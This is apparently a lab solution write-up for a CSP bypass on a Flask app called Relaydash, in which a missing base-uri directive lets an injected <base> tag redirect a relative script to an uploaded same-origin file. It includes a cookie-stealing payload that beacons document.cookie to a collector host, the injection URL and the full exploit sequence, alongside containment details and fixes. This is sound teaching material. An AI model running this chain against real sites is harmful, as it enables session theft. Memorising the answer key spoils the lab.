# Solution — CSP Bypass via Missing base-uri Directive

## Vulnerability class

**CWE-79 · CWE-829 · OWASP A03:2021 – Injection** — an HTML injection contained by
a CSP `script-src 'self'`, defeated because the policy omits the **`base-uri`**
directive. An injected `<base>` repoints the page's relative `<script src>` at an
attacker-controlled **same-origin** path, which still satisfies `script-src
'self'`.

## The setup

Relaydash's CSP is genuinely restrictive on `script-src`:

```
script-src 'self'      (no 'unsafe-inline')
```

so the reflected `?ref=` injection cannot run inline script. The lab's negative
control queues `<script>…</script>` and `<img src=x onerror=…>` through `?ref=` and
the collector receives **zero** beacons — the CSP holds against every inline
vector.

But two things line up:

1. The bundle is loaded with a **relative** URL:
   ```html
   <script src="main.js"></script>
   ```
   A relative URL is resolved against the document's **base URL** (by default, the
   page's own URL — so `main.js` means `/main.js` here).
2. The CSP has **no `base-uri` directive**. `script-src` controls _where scripts
   may load from_; `base-uri` controls _what the base URL may be set to_. They are
   different directives, and missing the second leaves relative-URL resolution
   attacker-influenceable.

## The gadget: same-origin content you control

`script-src 'self'` means the redirected script must still be **same-origin**. It
does not have to be a _different_ file the developer intended — any same-origin
path whose bytes you control will do. Relaydash serves uploaded scripts at
`/u/<id>/main.js`:

```
POST /upload   {"js":"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie);"}
      →  {"id":"<id>", "path":"/u/<id>/main.js"}
```

That upload is harmless on its own — it is just a file on the origin. It becomes
code execution only when a relative `<script src>` can be pointed at it.

## The bypass

Inject a `<base>` (a single tag, in `<head>`, **before** the script) that sets the
base URL to your upload's directory:

```
/?ref=<base href="/u/<id>/">
```

Now the page parses:

```html
<head>
  <title>Relaydash</title>
  <base href="/u/<id>/" />
  <!-- injected -->
  <script src="main.js"></script>
  <!-- resolves against the base above -->
</head>
```

- `main.js` resolves against `http://app:8080/u/<id>/` → `/u/<id>/main.js`.
- That is **same-origin**, so `script-src 'self'` permits it.
- It is **your** uploaded bundle, so it runs in Relaydash's origin, reads the
  admin's non-HttpOnly `session` cookie, and beacons it to the collector.

The trailing slash on `href="/u/<id>/"` matters: `<base href="/u/<id>">` (no slash)
would resolve `main.js` to `/u/main.js`. The base URL is treated as a directory.

## End-to-end

```
# 1. Upload the attacker bundle (served same-origin):
POST /upload   {"js":"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie);"}
      →  /u/<id>/main.js

# 2. Queue the <base> injection for the admin bot:
POST /report   {"url":"/?ref=<base href=\"/u/<id>/\">"}    (URL-encoded)

# 3. Bot loads the page; main.js resolves to /u/<id>/main.js, runs, beacons the cookie.

# 4. Read the collector, submit the session:
GET  /oob/received            # /report?c=session%3D<32 hex>
POST /solve   {"c":"<32 hex>"}      →  FLAG{…}
```

`tests/exploit.py` automates this and notes whether a `base-uri` directive is
present (it must be absent for the hijack to work).

## Why the containment holds

- Collector + bot live on a `backend` network with `internal: true` — **no route
  off the host**. The stolen cookie reaches the in-lab collector but never the
  internet, so the lab ships a real cookie-theft primitive at `risk: low`.
- `/internal/bot-login` and `/internal/queue` are firewalled to the backend subnet
  (login also gated by `BOT_KEY`), so a public visitor cannot mint the admin
  cookie or read the queue and skip the XSS.
- Single gunicorn worker: the queue, uploads and admin session live in-process, so
  the bot and the exploit see one consistent state.

## The fix

1. **Set `base-uri 'none'` (or `'self'`) — the real fix.** It costs one token and
   makes a `<base>` injection inert: the relative `main.js` can only ever resolve
   against the real document URL. A `script-src` without a companion `base-uri` is
   an incomplete policy; the two belong together.
2. **Do not load first-party scripts by bare relative name.** Use an absolute path
   (`/main.js`) or, better, a full URL with **Subresource Integrity**
   (`<script src="/main.js" integrity="sha384-…">`) — SRI makes the browser reject
   any bytes that do not match the expected hash, so a repointed script fails even
   if base-uri were missing.
3. **Encode the reflected output.** With `?ref=` HTML-escaped (autoescape on),
   there is no tag injection to place a `<base>` through in the first place. CSP is
   defence-in-depth, not the primary control.

## Deviation from the catalog stack

The catalogued scenario is a **Ruby/Sinatra** target that points `<base>` at a
_second attacker origin_. That framing is subtly unsound under `script-src 'self'`:
a cross-origin script would be **blocked** by `'self'` regardless of the base. The
technically-correct variants are (a) a nonce-based CSP where a base repoints a
_nonced_ relative script to a foreign host (the nonce, not the host, authorises
it), or (b) — used here — keep the redirected script **same-origin**, which
`script-src 'self'` genuinely permits. This lab re-platforms to **Flask** and takes
(b): the `<base>` repoints the relative bundle at an attacker-uploaded same-origin
path (`/u/<id>/main.js`). The taught lesson — a missing `base-uri` lets a `<base>`
injection hijack relative-script resolution — is identical and, here, sound. The
Playwright verifier stands in for Puppeteer.
